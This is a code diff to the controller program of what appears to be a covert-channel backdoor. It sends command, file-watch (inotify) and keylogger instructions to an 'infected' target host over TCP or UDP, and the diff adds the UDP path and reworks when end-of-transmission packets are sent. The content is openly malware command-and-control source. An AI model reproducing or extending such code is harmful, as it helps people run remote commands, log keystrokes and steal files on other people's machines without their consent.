@@ -102,21 +102,31 @@ int main(int argc, char **argv){
         return 0;
     }
 
-    //send packet with COMMAND keys and encrypted data
-    if(if_command == true) {
+    //COMMAND
+    if(if_command == true && tcp == true) {
         covert_send(localip, targetip, UPORT, UPORT, data, COMMAND);
-    //send packet with INOTIFY keys and encrypted
+        covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+    } if(if_command == true && tcp == false) {
+        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, COMMAND);
+
+    //INOTIFY
     } else if(if_file == true && if_directory == true) {
         snprintf(data, BUFSIZ, "%s\n%s", directory, file);
-        printf("DEBUG: data: %s\n", data);
-        covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
-    //send packet with KEYLOGGER keys and encrypted
-    } else if (if_keylogger == true) {
-        covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
-    }
 
-    //send EOT to tell the infected that we are ready to receive
-    covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+        if(tcp == true) {
+            covert_send(localip, targetip, UPORT, UPORT, data, INOTIFY);
+            covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+        } else {
+            covert_udp_send_data(localip, targetip, UPORT, UPORT, data, INOTIFY);
+        }
+
+    //KEYLOGGER
+    } else if (if_keylogger == true && tcp == true) {
+        covert_send(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
+        covert_send(localip, targetip, UPORT, UPORT, data, EOT);
+    } else if (if_keylogger == true && tcp == false) {
+        covert_udp_send_data(localip, targetip, UPORT, UPORT, data, KEYLOGGER);
+    }
 
     //create filter (tcp/udp, command, ip, port)
     Filter = InitFilter(targetip, localip, false, tcp);
